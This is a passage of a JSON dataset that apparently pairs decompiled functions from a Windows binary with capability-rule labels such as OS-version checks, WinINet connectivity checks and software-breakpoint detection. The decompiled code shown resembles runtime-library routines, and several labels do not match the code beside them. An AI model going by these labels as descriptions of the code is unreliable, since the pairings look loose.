return;\n}\n",
        "token_count": 761
    },
    "0040d102": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0040d102(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    \n    uVar2 = 0;\n    if (((param_1[3] & 3) == 2) && ((param_1[3] & 0x108U) != 0)) {\n        arg_10h = *param_1 - param_1[2];\n        if (0 < arg_10h) {\n            iVar1 = fcn.00412211(param_1[4], param_1[2], arg_10h);\n            if (iVar1 == arg_10h) {\n                if (param_1[3] < '\\0') {\n                    param_1[3] = param_1[3] & 0xfffffffd;\n                }\n            }\n            else {\n                param_1[3] = param_1[3] | 0x20;\n                uVar2 = 0xffffffff;\n            }\n        }\n    }\n    param_1[1] = 0;\n    *param_1 = param_1[2];\n    return uVar2;\n}\n",
        "token_count": 259
    },
    "0040dcdc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040dcdc(int32_t arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *arg_8h_00;\n    int32_t iVar3;\n    \n    arg_8h_00 = arg_ch;\n    fcn.0040cf50(arg_8h, 0, 0x90);\n    if (*arg_ch != '\\0') {\n        if ((*arg_ch != '.') || (arg_ch[1] == '\\0')) {\n            arg_ch = NULL;\n            do {\n                uVar2 = fcn.00414950(arg_8h_00, 0x43b2d8);\n                if (uVar2 == 0) {\n                    return 0xffffffff;\n                }\n                cVar1 = arg_8h_00[uVar2];\n                if (arg_ch == NULL) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h;\n                    if (cVar1 == '.') {\n                        return 0xffffffff;\n                    }\n                }\n                else if (arg_ch == 0x1) {\n                    if (0x3f < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if (cVar1 == '_') {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x40;\n                }\n                else {\n                    if (arg_ch != 0x2) {\n                        return 0xffffffff;\n                    }\n                    if (0xf < uVar2) {\n                        return 0xffffffff;\n                    }\n                    if ((cVar1 != '\\0') && (cVar1 != ',')) {\n                        return 0xffffffff;\n                    }\n                    iVar3 = arg_8h + 0x80;\n                }\n                fcn.004149a0(iVar3, arg_8h_00, uVar2);\n                if ((cVar1 == ',') || (cVar1 == '\\0')) {\n                    return 0;\n                }\n                arg_ch = arg_ch + 1;\n                arg_8h_00 = arg_8h_00 + uVar2 + 1;\n            } while( true );\n        }\n        fcn.004149a0(arg_8h + 0x80, arg_ch + 1, 0xf);\n        *(arg_8h + 0x8f) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 541
    },
    "0040ddb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040ddb8(uint param_1, int32_t param_2)\n\n{\n    fcn.00411ed0(param_1, param_2);\n    if (*(param_2 + 0x40) != '\\0') {\n        fcn.0040dcb8(param_1, 2, 0x43b2e0, param_2 + 0x40);\n    }\n    if (*(param_2 + 0x80) != '\\0') {\n        fcn.0040dcb8(param_1, 2, 0x43b2dc, param_2 + 0x80);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0040df00": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040df00(char *arg_8h, uchar *arg_ch, ushort *arg_10h, uint *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_94h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    if (arg_8h != NULL) {\n        if ((*arg_8h == 'C') && (arg_8h[1] == '\\0')) {\n            *arg_ch = 0x43;\n            arg_ch[1] = 0;\n            if (arg_10h != NULL) {\n                *arg_10h = 0;\n                arg_10h[1] = 0;\n                arg_10h[2] = 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 0;\n            }\n        }\n        else {\n            uVar1 = fcn.0040bc50(arg_8h);\n            if ((0x81 < uVar1) ||\n               ((iVar2 = fcn.00411e40(0x4416f0, arg_8h),  iVar2 != 0 &&\n                (iVar2 = fcn.00411e40(0x441668, arg_8h),  iVar2 != 0)))) {\n                iVar2 = fcn.0040dcdc(&var_94h, arg_8h);\n                if ((iVar2 != 0) || (iVar2 = fcn.00415203(&var_94h, 0x4428e0, &var_94h),  iVar2 == 0))\n                goto code_r0x0040e051;\n                *0x4428e8 = *0x4428e4;\n                fcn.0040ddb8(0x4416f0, &var_94h);\n                if ((*arg_8h == '\\0') || (uVar1 = fcn.0040bc50(arg_8h),  0x81 < uVar1)) {\n                    arg_8h = 0x4230c8;\n                }\n                *0x4416ea = 0;\n                fcn.004149a0(0x441668, arg_8h, 0x82);\n            }\n            if (arg_10h != NULL) {\n                fcn.0040bce0(arg_10h, 0x4428e0, 6);\n            }\n            if (arg_14h != NULL) {\n                fcn.0040bce0(arg_14h, 0x4428e8, 4);\n            }\n            fcn.00411ed0(arg_ch, 0x4416f0);\n        }\n    }\ncode_r0x0040e051:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 636
    },
    "0040e05c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040e05c(uint param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint unaff_EBX;\n    int32_t iVar9;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint in_stack_fffffe3c;\n    uint in_stack_fffffe40;\n    int32_t in_stack_fffffe44;\n    uint in_stack_fffffe48;\n    uint32_t arg_1ch;\n    uint32_t in_stack_fffffe50;\n    int32_t iStack420;\n    int32_t iStack404;\n    int32_t iStack400;\n    uchar uStack396;\n    uint8_t auStack395 [255];\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x441350;\n    iVar4 = fcn.0040df00(param_1, auStack140, &stack0xfffffe50, &iStack404);\n    if (iVar4 != 0) {\n        iVar9 = unaff_ESI * 0xc;\n        iVar4 = fcn.00411e40(auStack140, *(iVar9 + 0x44177c));\n        if (iVar4 != 0) {\n            iVar4 = fcn.0040bc50(auStack140);\n            iVar4 = fcn.0040b8de(iVar4 + 1);\n            if (iVar4 != 0) {\n                arg_8h = *(iVar9 + 0x44177c);\n                puVar1 = unaff_ESI * 4 + 0x442be8;\n                arg_1ch = *puVar1;\n                iStack400 = unaff_ESI * 6 + 0x442c0c;\n                fcn.0040bce0(&stack0xfffffe3c, iStack400, 6);\n                iVar3 = *0x442c00;\n                uVar5 = fcn.00411ed0(iVar4, auStack140);\n                *(iVar9 + 0x44177c) = uVar5;\n                *puVar1 = in_stack_fffffe50 & 0xffff;\n                fcn.0040bce0(iStack400, &stack0xfffffe50, 6);\n                uVar8 = *0x441cc0;\n                if (unaff_ESI == 2) {\n                    iStack400 = 0;\n                    *0x442c00 = iStack404;\n                    iStack420 = *0x441664;\n                    piVar6 = 0x441640;\n                    iVar7 = *0x441660;\n                    do {\n                        if (iStack404 == *piVar6) {\n                            if (iStack400 != 0) {\n                                iVar2 = iStack400 * 8;\n                                *0x441640 = *(iVar2 + 0x441640);\n                                *0x441644 = *(iVar2 + 0x441644);\n                                *(iVar2 + 0x441640) = iVar7;\n                                *(iVar2 + 0x441644) = iStack420;\n                            }\n                            break;\n                        }\n                        in_stack_fffffe44 = *piVar6;\n                        iStack400 = iStack400 + 1;\n                        *piVar6 = iVar7;\n                        iVar2 = piVar6[1];\n                        piVar6[1] = iStack420;\n                        piVar6 = piVar6 + 2;\n                        iVar7 = in_stack_fffffe44;\n                        iStack420 = iVar2;\n                    } while (piVar6 < 0x441668);\n                    uVar8 = *0x441644;\n                    if (iStack400 == 5) {\n                        iVar7 = fcn.004153b8(1, 0x43b218, 0x7f, &uStack396, iStack404, *0x442bf0, 1, unaff_EDI, \n                                             unaff_EBX, in_stack_fffffe3c, in_stack_fffffe40, in_stack_fffffe44, \n                                             in_stack_fffffe48, arg_1ch, in_stack_fffffe50);\n                        if (iVar7 == 0) {\n                            *0x441644 = 0;\n                        }\n                        else {\n                            uVar8 = 0;\n                            do {\n                                auStack395[uVar8 * 2] = auStack395[uVar8 * 2] & 1;\n                                uVar8 = uVar8 + 1;\n                            } while (uVar8 < 0x7f);\n                            iVar7 = fcn.0040da60(&uStack396, \n                                                 L\"        h((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10 \"\n                                                 , 0xfe);\n                            *0x441644 = iVar7 == 0;\n                        }\n                        *0x441640 = *0x442c00;\n                        uVar8 = *0x441644;\n                    }\n                }\n                *0x441cc0 = uVar8;\n                if (unaff_ESI == 1) {\n                    *0x442c04 = iStack404;\n                }\n                iVar7 = (**(iVar9 + 0x441780))();\n                if (iVar7 == 0) {\n                    if (arg_8h != 0x4415e0) {\n                        fcn.0040cfb5(arg_8h);\n                    }\n                }\n                else {\n                    *(iVar9 + 0x44177c) = arg_8h;\n                    fcn.0040cfb5(iVar4);\n                    *puVar1 = arg_1ch;\n                    *0x442c00 = iVar3;\n                }\n            }\n        }\n    }\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 1475
    },
    "0040e2eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e2eb(char *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iStack152;\n    int32_t iStack144;\n    uchar auStack140 [132];\n    uint uStack8;\n    \n    uStack8 = *0x441350;\n    if (param_2 != 0) {\n        if (param_1 != NULL) {\n            fcn.0040e05c(param_1);\n        }\n        goto code_r0x0040e425;\n    }\n    bVar1 = true;\n    iStack144 = 0;\n    if (param_1 != NULL) {\n        if (((*param_1 == 'L') && (param_1[1] == 'C')) && (param_1[2] == '_')) {\n            do {\n                pcVar2 = fcn.004155c0(param_1, 0x43b2fc);\n                if (((pcVar2 == NULL) || (iVar3 = pcVar2 - param_1,  iVar3 == 0)) || (*pcVar2 == ';'))\n                goto code_r0x0040e425;\n                iStack152 = 1;\n                puVar5 = 0x441784;\n                do {\n                    iVar4 = fcn.00415580(*puVar5, param_1, iVar3);\n                    if ((iVar4 == 0) && (iVar4 = fcn.0040bc50(*puVar5),  iVar3 == iVar4)) break;\n                    iStack152 = iStack152 + 1;\n                    puVar5 = puVar5 + 3;\n                } while (puVar5 < 0x4417b5);\n                pcVar2 = pcVar2 + 1;\n                iVar3 = fcn.00414950(pcVar2, 0x43b2f4);\n                if ((iVar3 == 0) && (*pcVar2 != ';')) goto code_r0x0040e425;\n                if (iStack152 < 6) {\n                    fcn.004149a0(auStack140, pcVar2, iVar3);\n                    auStack140[iVar3] = 0;\n                    iVar4 = fcn.0040e05c(auStack140);\n                    if (iVar4 != 0) {\n                        iStack144 = iStack144 + 1;\n                    }\n                }\n            } while ((pcVar2[iVar3] != '\\0') && (param_1 = pcVar2 + iVar3 + 1,  *param_1 != '\\0'));\n        }\n        else {\n            iVar3 = fcn.0040df00(param_1, auStack140, 0, 0);\n            if (iVar3 == 0) goto code_r0x0040e425;\n            puVar5 = 0x44177c;\n            do {\n                if (puVar5 != 0x44177c) {\n                    iVar3 = fcn.00411e40(auStack140, *puVar5);\n                    if ((iVar3 == 0) || (iVar3 = fcn.0040e05c(auStack140),  iVar3 != 0)) {\n                        iStack144 = iStack144 + 1;\n                    }\n                    else {\n                        bVar1 = false;\n                    }\n                }\n                puVar5 = puVar5 + 3;\n            } while (puVar5 < 0x4417b9);\n            if (bVar1) {\n                fcn.0040de41();\n                fcn.0040cfb5(*0x44177c);\n                *0x44177c = 0;\n                goto code_r0x0040e425;\n            }\n        }\n        if (iStack144 == 0) goto code_r0x0040e425;\n    }\n    fcn.0040de41();\ncode_r0x0040e425:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 894
    },
    "0040ea41": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040ea41(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0041580c(iVar1, param_1, 1);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 1;\n}\n",
        "token_count": 157
    },
    "0040ea7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040ea7b(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0041580c(iVar1, param_1, 2);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 2;\n}\n",
        "token_count": 158
    },
    "0040eab5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.0040eab5(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    if (1 < *(iVar1 + 0x28)) {\n        uVar2 = fcn.0041580c(iVar1, param_1, 4);\n        return uVar2;\n    }\n    return *(*(iVar1 + 0x48) + param_1 * 2) & 4;\n}\n",
        "token_count": 158
    },
    "0040ece2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_12h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ece2(void)\n\n{\n    uint8_t *puVar1;\n    char16_t *noname_3;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    ushort *puVar6;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    int32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uchar auStack24 [2];\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x441350;\n    var_1ch = 0;\n    if (*0x442bf0 == 0) {\n        *0x4417c0 = \n        L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x81\\x81\\x81\\x81\\x81\\x81\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x10\\x10\\x10\\x10\\x10\\x10\\x82\\x82\\x82\\x82\\x82\\x82\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x10\\x10\\x10\\x10 \"\n        ;\n        *0x443210 = NULL;\n        *0x443200 = NULL;\n        goto code_r0x0040eec1;\n    }\n    if ((*0x442c00 == 0) && (iVar3 = fcn.004158aa(0, *0x442c18, 0x1004, 0x442c00),  iVar3 != 0)) {\ncode_r0x0040ee94:\n        fcn.0040cfb5(var_20h);\n        fcn.0040cfb5(var_24h);\n    }\n    else {\n        var_20h = fcn.0040b8de(4);\n        var_24h = fcn.0040b8de(0x300);\n        var_1ch = fcn.0040b8de(0x101);\n        if ((var_20h == NULL) || ((var_24h == 0 || (var_1ch == 0)))) goto code_r0x0040ee94;\n        *var_20h = 0;\n        iVar3 = 0;\n        do {\n            *(iVar3 + var_1ch) = iVar3;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x100);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(*0x442c00, &var_18h);\n        if ((iVar3 == 0) || (5 < var_18h)) goto code_r0x0040ee94;\n        *0x441cd0 = var_18h & 0xffff;\n        if ((1 < *0x441cd0) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                uVar2 = *puVar4;\n                if (uVar2 == 0) break;\n                for (uVar5 = puVar4[-1]; uVar5 <= uVar2; uVar5 = uVar5 + 1) {\n                    *(uVar5 + var_1ch) = 0;\n                    uVar2 = *puVar4;\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        noname_3 = var_24h + 0x100;\n        iVar3 = fcn.004153b8(1, var_1ch, 0x100, noname_3, 0, 0, 0, unaff_ESI, unaff_EBX, unaff_EDI, noname_3, var_20h, \n                             var_1ch, var_18h, _auStack24);\n        if (iVar3 == 0) goto code_r0x0040ee94;\n        *(var_24h + 0xfe) = 0;\n        if ((1 < *0x441cd0) && (var_12h != '\\0')) {\n            puVar4 = &var_12h + 1;\n            do {\n                if (*puVar4 == 0) break;\n                uVar5 = puVar4[-1];\n                if (uVar5 <= *puVar4) {\n                    puVar6 = var_24h + 0x100 + uVar5 * 2;\n                    do {\n                        *puVar6 = 0x8000;\n                        uVar5 = uVar5 + 1;\n                        puVar6 = puVar6 + 1;\n                    } while (uVar5 <= *puVar4);\n                }\n                puVar1 = puVar4 + 1;\n                puVar4 = puVar4 + 2;\n            } while (*puVar1 != 0);\n        }\n        fcn.0040bce0(var_24h, var_24h + 0x200, 0xfe);\n        *0x4417c0 = noname_3;\n        *0x443200 = var_24h + 0xfe;\n        *0x443210 = var_20h;\n    }\n    fcn.0040cfb5(var_1ch);\ncode_r0x0040eec1:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 1418
    },
    "0040f91a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f91a(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_58h;\n    uint lpSystemInfo;\n    int32_t var_48h;\n    uint32_t lpBuffer;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_13h;\n    uint lpflOldProtect;\n    int32_t dwSize;\n    uint32_t lpAddress;\n    \n    fcn.0040fc80();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(&var_58h, &lpBuffer, 0x1c);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        uVar4 = (~(var_48h - 1U) & &var_58h) - var_48h;\n        uVar3 = ((-(*0x442a60 != 1) & 0xfffffff1) + 0x11) * var_48h + var_24h;\n        dwSize = var_48h;\n        if (uVar3 <= uVar4) {\n            lpAddress = uVar4;\n            if (*0x442a60 != 1) {\n                lpAddress = var_24h;\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(lpAddress, &lpBuffer, 0x1c);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    lpAddress = lpAddress + var_1ch;\n                } while ((var_18h & 0x1000) == 0);\n                lpAddress = lpBuffer;\n                if ((var_13h & 1) != 0) {\n                    return 1;\n                }\n                if (uVar4 < lpBuffer) {\n                    return 0;\n                }\n                if (lpBuffer < uVar3) {\n                    lpAddress = uVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualAlloc)(lpAddress, dwSize, 0x1000, 4);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (lpAddress, dwSize, (-(*0x442a60 != 1) & 0x103) + 1, &lpflOldProtect);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 589
    },
    "0040fcbd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0040fcbd(void)\n\n{\n    if ((*0x442a60 == 2) && (4 < *0x442a6c)) {\n        return 1;\n    }\n    return 3;\n}\n",
        "token_count": 50
    },
    "0040fcd7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.0040fcd7(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x4431ec = (*_sym.imp.KERNEL32.dll_HeapCreate)(param_1 == 0, 0x1000, 0);\n    if (*0x4431ec == 0) {\n        return 0;\n    }\n    *0x4431fc = fcn.0040fcbd();\n    if ((*0x4431fc == 3) && (iVar1 = fcn.0040fdc2(0x3f8),  iVar1 == 0)) {\n        (*_sym.imp.KERNEL32.dll_HeapDestroy)(*0x4431ec);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 169
    },
    "00410dcb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410dcb(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h != 0) {\n        fcn.00416ce8(&var_8h, arg_10h);\n        *arg_ch = var_8h;\n        arg_ch[1] = var_4h;\n        return;\n    }\n    fcn.00416d63(&arg_8h, arg_10h);\n    *arg_ch = arg_8h;\n    return;\n}\n",
        "token_count": 143
    },
    "00410e26": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410e26(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t *in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uchar *unaff_EBX;\n    \n    if (arg_10h != '\\0') {\n        fcn.00410e09();\n    }\n    if (*in_EAX == 0x2d) {\n        *unaff_EBX = 0x2d;\n        unaff_EBX = unaff_EBX + 1;\n    }\n    puVar1 = unaff_EBX;\n    if (0 < arg_8h) {\n        puVar1 = unaff_EBX + 1;\n        *unaff_EBX = *puVar1;\n        *puVar1 = *0x441cd4;\n    }\n    puVar1 = fcn.00411ed0(puVar1 + arg_8h + (arg_10h == '\\0'), \"e+000\");\n    if (arg_ch != 0) {\n        *puVar1 = 0x45;\n    }\n    if (*in_EAX[3] != '0') {\n        iVar2 = in_EAX[1] + -1;\n        if (iVar2 < 0) {\n            iVar2 = -iVar2;\n            puVar1[1] = 0x2d;\n        }\n        if (99 < iVar2) {\n            iVar3 = iVar2 / 100;\n            iVar2 = iVar2 % 100;\n            puVar1[2] = puVar1[2] + iVar3;\n        }\n        if (9 < iVar2) {\n            iVar3 = iVar2 / 10;\n            iVar2 = iVar2 % 10;\n            puVar1[3] = puVar1[3] + iVar3;\n        }\n        puVar1[4] = puVar1[4] + iVar2;\n    }\n    return;\n}\n",
        "token_count": 441
    },
    "00410f40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00410f40(uchar *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uchar *puVar3;\n    \n    iVar1 = in_EAX[1];\n    if ((arg_10h != '\\0') && (iVar1 + -1 == arg_ch)) {\n        iVar2 = *in_EAX;\n        arg_8h[(iVar2 == 0x2d) + iVar1 + -1] = 0x30;\n        (arg_8h + (iVar2 == 0x2d) + iVar1 + -1)[1] = 0;\n    }\n    puVar3 = arg_8h;\n    if (*in_EAX == 0x2d) {\n        *arg_8h = 0x2d;\n        puVar3 = arg_8h + 1;\n    }\n    if (in_EAX[1] < 1) {\n        fcn.00410e09();\n        *puVar3 = 0x30;\n        puVar3 = puVar3 + 1;\n    }\n    else {\n        puVar3 = puVar3 + in_EAX[1];\n    }\n    if (0 < arg_ch) {\n        fcn.00410e09();\n        *puVar3 = *0x441cd4;\n        iVar1 = in_EAX[1];\n        if (iVar1 < 0) {\n            if ((arg_10h != '\\0') || (SBORROW4(arg_ch, -iVar1) == arg_ch + iVar1 < 0)) {\n                arg_ch = -iVar1;\n            }\n            fcn.00410e09();\n            fcn.0040cf50(puVar3 + 1, 0x30, arg_ch);\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 427
    },
    "00411389": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00411389(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uchar auStack272 [260];\n    uchar uStack12;\n    uint uStack8;\n    \n    uStack8 = *0x441350;\n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x441910)) break;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x13);\n    if (param_1 == *(uVar1 * 8 + 0x441910)) {\n        if ((*0x4428d4 == 1) || ((*0x4428d4 == 0 && (*0x4412ec == 1)))) {\n            uStack288 = 0;\n            puStack292 = &stack0x00000004;\n            uStack296 = *(uVar1 * 8 + 0x441914);\n            uStack296 = fcn.0040bc50();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (param_1 != 0xfc) {\n            uStack288 = 0x104;\n            puStack292 = &stack0xfffffef0;\n            uStack296 = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.00411ed0();\n            }\n            iVar2 = fcn.0040bc50();\n            if (0x3c < 